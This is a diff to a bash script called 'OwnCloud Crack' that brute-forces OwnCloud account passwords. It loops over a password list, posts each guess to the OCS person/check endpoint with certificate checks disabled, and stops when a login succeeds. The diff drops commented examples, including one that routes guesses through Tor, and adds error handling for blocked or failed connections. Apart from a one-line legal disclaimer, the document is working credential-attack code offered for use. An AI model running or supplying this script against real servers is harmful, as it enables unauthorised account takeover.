@@ -1,6 +1,6 @@
 #!/bin/bash
 # OwnCloud Crack
-# Copyright (C) 2016 51x
+# GNU GPL, see LICENSE.txt for details. (C) 2016 51x
 #
 # Description: brute force OwnCloud accounts. For legal purposes only (eg. approved penetration testing).
 
@@ -36,22 +36,25 @@ PWL=$3
 echo "Passwordlist specified: "$PWL
 echo
 
-
-# Some ideas
-# curl --socks4a 127.0.0.1:9050 https://address.onion/ocs/v1.php/person/check -d 'login=admin&password=pass' --insecure
-# curl https://randomdomain.com/ocs/v1.php/person/check -d 'login=admin&password=pass'
-# wget -qO- $URL --post-data="login=$USER&password=$PW" | grep "<status>ok</status>" ; print $PW
-
-
 echo "Starting brute force..."
 while read PWCURR ;
     do
       echo "Trying:" $PWCURR
-      if [[ $(wget -qO- $URL -U "$USER_AGENT" --post-data="login=$USER&password=$PWCURR" --no-check-certificate | grep "<status>ok</status>") ]];
+       crk=$(wget -O- $URL -U "$USER_AGENT" --post-data="login=$USER&password=$PWCURR" --no-check-certificate 2>&1 | egrep -o "<status>ok</status>|Connection refused.|unable to resolve host address")
+       echo $crk
+       if [ "$crk" == '<status>ok</status>' ]
           then
             echo -e "\nPassword found! " $USER" : "$PWCURR "\n" 
             exit 1
-      fi
+       fi
+       if [ "$crk" == 'Connection refused.' ]
+          then
+            echo -e "\n Connection refused. Kicked out?"
+            exit 1
+       fi
+       if [ "$crk" == 'unable to resolve host address' ]
+          then
+            echo -e "\n Can't resolve host. Maybe typo or your DNS server?"
+            exit 1
+       fi
     done < $PWL
-
-
